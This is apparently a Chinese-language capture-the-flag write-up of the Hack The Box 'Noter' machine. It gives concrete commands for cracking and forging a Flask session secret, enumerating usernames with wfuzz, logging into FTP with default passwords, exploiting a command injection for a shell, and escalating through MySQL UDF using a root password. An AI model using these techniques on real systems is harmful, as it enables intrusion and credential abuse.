---
title: htb noter
copyright: true
date: 2022-05-11 15:51:55
tags: 靶机渗透
---
htb不允许公开active靶机的wp，这里只是自己记录下渗透过程。
<!--more-->
难度：medium  

**1.端口扫描**  
nmap -sVC -A --min-rate 5000 10.129.171.250 > port.txt  
21 22 5000端口开放  

**2.web**  
5000端口是个flask应用，熟悉的味道，熟悉的配方，flask基本上就考虑jinja2 ssti和secret_key伪造了  
![1.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/1.png)  
注册一个普通用户，在添加笔记功能发现了一个xss  
![2.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/2.png)  
![3.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/3.png)  
在这里尝试了很久才基本确定这个xss没有利用价值  
尝试leak secret_key失败，尝试爆破session  
```
flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.YnpVIQ.4XYlyJbVnl7qlkIJENKNrgDSkVI" < /usr/local/lib/python3.9/dist-packages/flask_unsign_wordlist-2022.19-py3.9.egg/flask_unsign_wordlist/wordlists/all.txt
```
```
[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2688): -----BEGIN PRIVATE KEY-----DEF
[+] Found secret key after 16640 attempts32.com/v1/pe
'secret123'
```
使用伪造的admin session登录失败，应该没有admin这个用户，关注到登录时用户名存在与否的显示不同。  
![4.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/4.png)  
![5.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/5.png)  
fuzz有效用户名  
```
wfuzz -t 5 --ss "Invalid login" -d 'username=FUZZ&password=1' -w /root/桌面/tools/字典/SecLists-master/Usernames/cirt-default-usernames.txt http://10.129.173.40:5000/login
```
![6.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/6.png)  
其中test是我测试时创建的用户，伪造TEST 和blue的session试试，发现blue是vip用户  
```
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret "secret123"

eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YnqLdQ.XgF7a8l7SFd4HdntVKE-0YHGdeE
```
![7.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/7.png)  
在blue的笔记中发现了ftp服务的一个用户名密码blue  blue@Noter!和管理员用户名ftp_admin  
![8.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/8.png)  
使用blue登入ftp服务器，发现了一个密码策略pdf，知道了默认密码为username@site_name!  
![9.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/9.png)  
使用ftp_admin  ftp_admin@Noter!   登入ftp，获取两个版本的flask源码，通过beyondcompare辅助审计代码，发现mysql root用户名密码（后边要用）和一个命令注入点：  
这里的r.text.strip()可控，使用;可以在shell里执行多条命令  
![10.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/10.png)  
kali上构造一个md文件，本地监听+远程导出一下，getshell  
![11.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/11.png)  
![12.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/12.png)  
![13.png](https://github.com/lockcy/penetration-kb/tree/master/htb-noter/13.png)  
cat /home/svc/user.txt  

**3.提权**
上传pspy64看下进程，没什么可疑的，跑下linpeas，尝试了一番也没啥结果，这时想起了mysql用户名密码，udf一下。  
这里刚开始犯蠢了，直奔插件目录/usr/lib/x86_64-linux-gnu/mariadb19/plugin/ 想上传udf可执行程序，发现没有权限，想了一段时间，后来发现直接用mysql root用户往该目录里二进制dump即可。  
https://github.com/lockcy/penetration-kb/blob/master/htb-noter/linux32udf.py
```
python linux32udf.py --username root --password Nildogg36
./sh -p
```
获取root权限  
cat /root/root.txt  
